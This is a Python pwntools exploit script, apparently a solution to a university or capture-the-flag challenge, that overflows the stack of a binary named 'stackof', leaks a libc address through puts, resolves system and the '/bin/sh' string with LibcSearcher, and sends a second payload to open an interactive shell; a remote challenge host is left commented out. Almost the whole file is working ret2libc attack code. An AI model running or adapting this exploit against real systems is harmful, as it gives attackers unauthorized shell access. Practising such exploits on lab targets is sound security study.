#!/usr/bin/env python
from pwn import *
from LibcSearcher import LibcSearcher

#sh = remote("cityf01.cs.cityu.edu.hk", 30011)
sh = process('./stackof')

ret2libc = ELF('./stackof')

puts_plt = ret2libc.plt['puts']
libc_start_main_got = ret2libc.got['__libc_start_main']
main = ret2libc.symbols['main']

#"leak libc_start_main_got addr and return to main again"
payload = flat(['A' * 146, puts_plt, main, libc_start_main_got])
with open("input", "wb") as f:
	f.write(payload+b"\n")


sh.sendlineafter('Can you find the shell?', payload)

#"get the related addr"

print(sh.recv())

libc_start_main_addr = u32(sh.recv()[0:4])
libc = LibcSearcher('__libc_start_main', libc_start_main_addr)
libcbase = libc_start_main_addr - libc.dump('__libc_start_main')
system_addr = libcbase + libc.dump('system')
binsh_addr = libcbase + libc.dump('str_bin_sh')

print(hex(system_addr), hex(libc_start_main_addr))

#"get shell"
payload = flat(['A' * 154, system_addr, 0x12345678, binsh_addr])
with open("input", "ab") as f:
	f.write(payload)
sh.sendline(payload)

sh.interactive()
